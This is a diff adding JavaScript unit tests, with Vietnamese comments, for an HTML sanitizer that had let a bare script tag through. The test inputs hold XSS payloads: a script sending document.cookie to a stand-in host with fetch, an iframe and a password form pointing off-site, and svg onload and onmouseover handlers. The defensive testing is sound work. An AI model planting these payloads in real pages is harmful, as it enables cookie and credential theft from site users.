@@ -154,3 +154,57 @@ test('boThe: rut chu tran, khong dinh ten the hay dia chi anh', () => {
 test('boThe: giai ma thuc the co ban', () => {
     assert.equal(boThe('<p>Gi&aacute; &lt; 5 &amp; &gt; 3</p>').includes('&lt;'), false);
 });
+
+// ---------------------------------------------------------------------------
+// chuanHoaNoiDung - cong vao
+//
+// Cho nay tung thung. chuanHoaNoiDung chi loc khi laHtml() cho la "giong bai
+// viet", ma danh sach the cua laHtml chi gom the trinh bay: khong co script,
+// khong co iframe. Nen mot chuoi chi chua <script> bi coi la van ban thuong va
+// duoc luu NGUYEN VEN.
+//
+// Luc phat hien, giao dien tinh co dung y het mot bieu thuc do nen no ve ra
+// chu chu chua chay. Nhung do khong phai mot bien phap bao ve - do la hai ban
+// sao o hai kho ma nguon phai giong het nhau moi an toan. Nhung test duoi day
+// giu cho cong vao tu no da dong, khong con phu thuoc vao ban sao ben kia.
+// ---------------------------------------------------------------------------
+
+test('chuanHoaNoiDung: <script> dung mot minh van bi loc, du khong the nao khac', () => {
+    const ra = chuanHoaNoiDung('<script>fetch("//xau",{body:document.cookie})</script>Tài liệu ôn thi');
+    assert.equal(/<script/i.test(ra), false);
+    assert.equal(ra.includes('document.cookie'), false);
+    // Bo ca ruot chu khong chi cai the: de lai ma JavaScript nam tho lo cung
+    // la hong, vi cho khac doc ra co the chay no.
+    assert.equal(ra, 'Tài liệu ôn thi');
+});
+
+test('chuanHoaNoiDung: iframe, svg, form dung mot minh deu bi loc', () => {
+    for (const doc of [
+        '<iframe src="//xau"></iframe>',
+        '<svg onload=alert(1)>',
+        '<form action="//xau"><input name="pw"></form>',
+    ]) {
+        assert.equal(chuanHoaNoiDung(doc), '', `chua chan: ${doc}`);
+    }
+});
+
+test('chuanHoaNoiDung: thuoc tinh on* keo ca chuoi qua bo loc', () => {
+    const ra = chuanHoaNoiDung('<div onmouseover=alert(1)>rê chuột</div>');
+    assert.equal(/onmouseover/i.test(ra), false);
+    assert.equal(ra.includes('rê chuột'), true);
+});
+
+test('chuanHoaNoiDung: van ban thuong giu NGUYEN VAN, khong bi doi thanh thuc the', () => {
+    // Neu loc tat ca thi '<' thanh '&lt;' va nguoi doc thay dung chu "&lt;"
+    // tren man hinh, vi trang doc ve van ban thuong bang React chu khong dien
+    // giai thuc the. Do la ly do cong vao phai co dieu kien chu khong loc bua.
+    const chu = 'Chương 1: Giới hạn. Xem mục 2 < 3 nhé.';
+    assert.equal(chuanHoaNoiDung(chu), chu);
+});
+
+test('chuanHoaNoiDung: HTML lanh manh khong bi cat oan', () => {
+    assert.equal(
+        chuanHoaNoiDung('<p>Chương 1</p><strong>ôn tập</strong>'),
+        '<p>Chương 1</p><strong>ôn tập</strong>'
+    );
+});
